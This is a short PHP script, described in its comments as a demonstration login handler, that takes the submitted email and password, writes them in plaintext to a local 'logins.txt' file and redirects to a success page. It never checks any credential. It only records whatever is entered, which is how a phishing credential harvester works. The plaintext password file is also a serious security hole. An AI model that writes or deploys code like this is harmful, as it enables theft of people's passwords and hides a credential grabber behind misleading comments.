<?php
// Ensure the POST data exists
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Simple file-based login for demonstration purposes
    // Normally, you'd check this against a database
    $logFile = 'logins.txt';
    $handle = fopen($logFile, 'a');
    fwrite($handle, "Email: $email, Password: $password\n");
    fclose($handle);

    // Redirect to success page
    header('Location: login-success.html');
    exit();
} else {
    // Invalid request
    echo "Invalid request method";
}
?>
